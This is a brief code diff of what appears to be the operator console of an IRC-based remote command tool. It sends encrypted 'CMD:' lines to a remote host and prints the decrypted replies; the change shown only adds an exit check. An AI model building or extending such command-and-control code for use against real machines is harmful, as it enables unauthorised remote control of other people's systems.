@@ -47,6 +47,8 @@ def main():
                 text=text.split("REP:")[-1]
                 path=key.decrypt(text.encode()).decode().strip()
                 command="CMD:"+input(f"{Fore.LIGHTCYAN_EX}{socket.gethostname()}@{path}$ ")
+                if "exit" in command.lower():
+                    exit()
                 send(irc, command)
                 rep=key.decrypt(irc.recv(10024).decode().split("REP:")[-1].encode()).decode().strip()
                 print("\n" + rep)
